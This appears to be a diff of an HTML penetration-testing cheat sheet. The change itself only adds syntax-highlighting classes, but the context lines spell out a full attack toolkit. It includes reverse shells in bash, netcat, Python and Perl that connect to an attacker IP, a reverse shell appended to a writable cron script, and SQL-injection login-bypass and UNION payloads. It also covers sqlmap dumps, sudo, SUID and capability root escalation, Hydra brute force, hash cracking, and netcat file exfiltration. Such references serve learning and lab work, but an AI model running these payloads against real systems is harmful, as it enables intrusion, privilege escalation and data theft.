@@ -24,7 +24,7 @@
 
             <div class="command-section">
                 <div class="command-title">Basic Scanning</div>
-                <pre><code># Quick scan (no stealth)
+                <pre><code class="language-bash"># Quick scan (no stealth)
 nmap &lt;tgt IP&gt;
 
 # Specific ports with version detection
@@ -52,7 +52,7 @@ sudo nmap --top-ports 100 -sU -sC -sV &lt;tgt IP&gt;</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Targeted Enumeration</div>
-                <pre><code># Vulnerability scanning
+                <pre><code class="language-bash"># Vulnerability scanning
 nmap --script vuln -p &lt;ports&gt; &lt;tgt IP&gt;
 
 # HTTP enumeration
@@ -75,7 +75,7 @@ nmap --script smb-enum-shares,smb-enum-users -p 445 &lt;tgt IP&gt;</code></pre>
 
             <div class="command-section">
                 <div class="command-title">System & User Information</div>
-                <pre><code># System details
+                <pre><code class="language-bash"># System details
 uname -a
 cat /etc/os-release
 hostname
@@ -113,7 +113,7 @@ env | grep MAIL</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Network Information</div>
-                <pre><code># Network interfaces and IPs
+                <pre><code class="language-bash"># Network interfaces and IPs
 ifconfig
 ip address
 ip a
@@ -136,7 +136,7 @@ ss -tulpn</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Process & Service Discovery</div>
-                <pre><code># Running processes
+                <pre><code class="language-bash"># Running processes
 ps aux
 ps -ef
 pstree</code></pre>
@@ -151,7 +151,7 @@ pstree</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Finding Sensitive Files</div>
-                <pre><code># SUID/SGID binaries (privilege escalation vectors)
+                <pre><code class="language-bash"># SUID/SGID binaries (privilege escalation vectors)
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 
@@ -203,7 +203,7 @@ ls -lt</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Privilege Vectors</div>
-                <pre><code># Sudo permissions
+                <pre><code class="language-bash"># Sudo permissions
 sudo -l
 
 # Scheduled tasks
@@ -230,7 +230,7 @@ find / -writable -type d 2>/dev/null | grep -E "^/usr/local|^/usr/bin|^/bin"</co
 
             <div class="command-section">
                 <div class="command-title">Container Detection</div>
-                <pre><code># Docker/container detection
+                <pre><code class="language-bash"># Docker/container detection
 cat /proc/self/cgroup
 ls -la /.dockerenv
 docker ps</code></pre>
@@ -248,7 +248,7 @@ docker ps</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Python pseudo-TTY Upgrade</div>
-                <pre><code># Spawn PTY shell
+                <pre><code class="language-bash"># Spawn PTY shell
 python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
@@ -265,7 +265,7 @@ script -qc /bin/bash /dev/null</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Full Interactive TTY</div>
-                <pre><code># Step 1: Spawn PTY
+                <pre><code class="language-bash"># Step 1: Spawn PTY
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # Step 2: Background the shell (Ctrl+Z)
@@ -284,7 +284,7 @@ stty raw && fg
 
             <div class="command-section">
                 <div class="command-title">Shell Customization</div>
-                <pre><code># Customize prompt (shows user, host, directory, time)
+                <pre><code class="language-bash"># Customize prompt (shows user, host, directory, time)
 PS1="[\u@\h]-[\w] \t [\$]: "</code></pre>
                 <div class="command-desc">
                     <ul>
@@ -299,7 +299,7 @@ PS1="[\u@\h]-[\w] \t [\$]: "</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Bash & Netcat</div>
-                <pre><code># Bash TCP
+                <pre><code class="language-bash"># Bash TCP
 bash -i >& /dev/tcp/&lt;Atk IP&gt;/&lt;port&gt; 0>&1
 
 # Netcat (with -e flag)
@@ -318,7 +318,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;Atk IP&gt; &lt;port&gt
 
             <div class="command-section">
                 <div class="command-title">Scripting Language Shells</div>
-                <pre><code># Python
+                <pre><code class="language-bash"># Python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;Atk IP&gt;",&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
 
 # PHP
@@ -337,7 +337,7 @@ perl -e 'use Socket;$i="&lt;Atk IP&gt;";$p=&lt;port&gt;;socket(S,PF_INET,SOCK_ST
 
             <div class="command-section">
                 <div class="command-title">Listener Setup</div>
-                <pre><code># Basic netcat listener
+                <pre><code class="language-bash"># Basic netcat listener
 nc -lvnp &lt;port&gt;</code></pre>
                 <div class="command-desc">
                     <ul>
@@ -352,7 +352,7 @@ nc -lvnp &lt;port&gt;</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Server-Side Template Injection (SSTI) Detection</div>
-                <pre><code># Test for template injection vulnerabilities
+                <pre><code class="language-bash"># Test for template injection vulnerabilities
 ${{<%[%'"}}%\</code></pre>
                 <div class="command-desc">
                     <ul>
@@ -369,7 +369,7 @@ ${{<%[%'"}}%\</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Authentication Bypass Payloads</div>
-                <pre><code># Username field payloads
+                <pre><code class="language-text"># Username field payloads
 admin' OR '1'='1
 admin' OR 1=1 --
 admin' OR 1=1 #
@@ -402,7 +402,7 @@ email=admin ' or 1 = 1 -- -&password=password
 
             <div class="command-section">
                 <div class="command-title">UNION-Based Data Extraction</div>
-                <pre><code># Determine column count
+                <pre><code class="language-sql"># Determine column count
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
@@ -427,7 +427,7 @@ email=admin ' or 1 = 1 -- -&password=password
 
             <div class="command-section">
                 <div class="command-title">SQLMap Automation</div>
-                <pre><code># URL-based injection
+                <pre><code class="language-bash"># URL-based injection
 sqlmap -u "http://&lt;tgt IP&gt;/page.php?id=1" --batch --dump
 
 # POST request from file
@@ -451,7 +451,7 @@ sqlmap -u "http://&lt;tgt IP&gt;/login" --data="username=admin&password=test" --
 
             <div class="command-section">
                 <div class="command-title">Sudo Exploitation (GTFOBins)</div>
-                <pre><code># Check sudo permissions first
+                <pre><code class="language-bash"># Check sudo permissions first
 sudo -l
 
 # vim/vi
@@ -478,7 +478,7 @@ sudo nmap --script=/tmp/shell.nse</code></pre>
 
             <div class="command-section">
                 <div class="command-title">SUID Binary Exploitation</div>
-                <pre><code># Find SUID binaries
+                <pre><code class="language-bash"># Find SUID binaries
 find / -perm -4000 2>/dev/null
 
 # Analyze suspicious binaries
@@ -503,7 +503,7 @@ export PATH=/tmp:$PATH
 
             <div class="command-section">
                 <div class="command-title">Capabilities Exploitation</div>
-                <pre><code># Find capabilities
+                <pre><code class="language-bash"># Find capabilities
 getcap -r / 2>/dev/null
 
 # Example: cap_setuid on Python
@@ -518,7 +518,7 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Cron Job Exploitation</div>
-                <pre><code># Find writable cron scripts
+                <pre><code class="language-bash"># Find writable cron scripts
 ls -la /etc/cron.d/
 ls -la /var/spool/cron/crontabs/
 
@@ -539,7 +539,7 @@ echo 'bash -i >& /dev/tcp/&lt;Atk IP&gt;/&lt;port&gt; 0>&1' >> /path/to/cron-scr
 
             <div class="command-section">
                 <div class="command-title">Automated Enumeration Scripts</div>
-                <pre><code># LinPEAS (comprehensive privilege escalation checker)
+                <pre><code class="language-bash"># LinPEAS (comprehensive privilege escalation checker)
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 # Or transfer:
 wget http://&lt;Atk IP&gt;/linpeas.sh
@@ -566,7 +566,7 @@ chmod +x pspy64
 
             <div class="command-section">
                 <div class="command-title">Password Cracking</div>
-                <pre><code># John the Ripper
+                <pre><code class="language-bash"># John the Ripper
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 john --format=raw-md5 hash.txt
 john --show hash.txt
@@ -587,7 +587,7 @@ hashcat -m 3200 -a 0 bcrypt.txt /usr/share/wordlists/rockyou.txt  # bcrypt</code
 
             <div class="command-section">
                 <div class="command-title">Network Service Brute Force</div>
-                <pre><code># Hydra
+                <pre><code class="language-bash"># Hydra
 hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://&lt;tgt IP&gt;
 hydra -L users.txt -P pass.txt ftp://&lt;tgt IP&gt;
 hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;tgt IP&gt; http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"</code></pre>
@@ -603,7 +603,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;tgt IP&gt; http-post-form
 
             <div class="command-section">
                 <div class="command-title">Web Directory & Subdomain Discovery</div>
-                <pre><code># Gobuster
+                <pre><code class="language-bash"># Gobuster
 gobuster dir -u http://&lt;tgt IP&gt; -w /usr/share/wordlists/dirb/common.txt
 gobuster dir -u http://&lt;tgt IP&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
@@ -624,7 +624,7 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.
 
             <div class="command-section">
                 <div class="command-title">SMB & Active Directory</div>
-                <pre><code># Enum4linux (SMB enumeration)
+                <pre><code class="language-bash"># Enum4linux (SMB enumeration)
 enum4linux -a &lt;tgt IP&gt;
 
 # SMBClient
@@ -647,7 +647,7 @@ crackmapexec smb &lt;tgt IP&gt; -u user -p pass -x whoami  # command execution</
 
             <div class="command-section">
                 <div class="command-title">File Transfer Methods</div>
-                <pre><code># Python HTTP server (on attacker)
+                <pre><code class="language-bash"># Python HTTP server (on attacker)
 python3 -m http.server 80
 python -m SimpleHTTPServer 80
 
@@ -671,7 +671,7 @@ nc &lt;Atk IP&gt; &lt;port&gt; < file</code></pre>
 
             <div class="command-section">
                 <div class="command-title">Additional Useful Tools</div>
-                <pre><code># searchsploit (offline exploit database)
+                <pre><code class="language-bash"># searchsploit (offline exploit database)
 searchsploit apache 2.4
 searchsploit -m 12345  # mirror exploit by ID
 searchsploit -x 12345  # examine exploit
